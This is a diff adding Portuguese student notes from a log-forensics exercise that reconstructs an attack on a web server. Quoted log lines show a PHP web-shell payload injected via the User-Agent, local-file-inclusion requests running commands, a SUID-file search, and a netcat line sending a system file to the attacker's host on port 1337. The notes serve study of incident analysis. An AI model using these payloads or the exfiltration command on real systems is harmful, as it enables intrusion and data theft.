@@ -186,8 +186,45 @@ dados e informações.
 PERGUNTAR AO PROFESSOR/FALAR COM ELE SOBRE TEORIA DA ALEXANDRA E PERGUNTAR SE O ÚLTIMO CAMPO DO ACCESS.LOG O QUE É
 EXATAMENTE
 
+Ele depois fez whoami 
+
+192.168.1.118 - - [06/Jan/2021:10:00:55 +0000] "GET /display.php?type=1&lang=/var/log/auth.log&cmd=ls%20/ HTTP/1.1" 200 741 "-" "HackToolKit"
+192.168.1.118 - - [06/Jan/2021:10:01:15 +0000] "GET /index.php HTTP/1.1" 200 791 "-" "<?php system($_GET['cmd']);?>"
+192.168.1.118 - - [06/Jan/2021:10:01:29 +0000] "GET /display.php?type=1&lang=/var/log/apache2/access.log&cmd=ls%20/ HTTP/1.1" 200 1379 "-" "python-requests/2.22.0"
+
+PERGUNTAR MELHOR AO STOR ISTO
+
+Ok, se reparares todos os GETs a partir de 10:01:29 o seu output é mostrado no whireshark "dentro"
+do GET de 10:01:15, que logo "Por azar" é onde estamos supostamente logados como um user igual
+a uma web shell!! -> falar com o professor lmao
+
+https://tastethelinux.com/2020/05/08/uname-command-in-linux-with-options/
+uname -a option is used to print all the information and step by step we will look at the information in detail.
+
+http://manpages.ubuntu.com/manpages/cosmic/man8/mount.8.html
+All  files  accessible  in a Unix system are arranged in one big tree, the file hierarchy,
+       rooted at /.  These files can be spread out  over  several  devices.   The  mount  command
+       serves  to  attach  the filesystem found on some device to the big file tree.
 
 
+Então, um dos comandos que ele tenta fazer e obter o output é "docker ps"; ora, este dá vazio, e o que
+era interessante saber seria se ele dá vazio porque não existe nenhum container ou então porque obteve
+permission denied, como aparece no error.log; estou mais inclinado para esta última opção porque era
+pouco provável um serviço web estar online sem estar a rodar num container, além de que, lá está, 
+foram mostradis erros associados ao docker no error.log e o atacante apenas faz uma vez um comando
+relacionado com o docker, daí que todos os erros que apareçam do docker sejam, em última instância, associados
+apenas a este único comando introduzido.
+
+https://www.toolbox.com/tech/operating-systems/question/find-usr-bin-perm-4000-print-011813/
+
+cmd=find%20/%20-perm%20-4000
+
+ele está a ver quais os ficheiros/objetos com permissão s, aquilo que se falou nas aulas REVER
+
+cmd=cat%20/usr/sbin/sysinfo%7Cnc%20-w%205%20192.168.1.118%201337
+nc é netcat, a flag - w está relacionada com o timeout que neste caso é de 5 segundos
+%7 representa |
+1337 é o número d porta
 
 
 
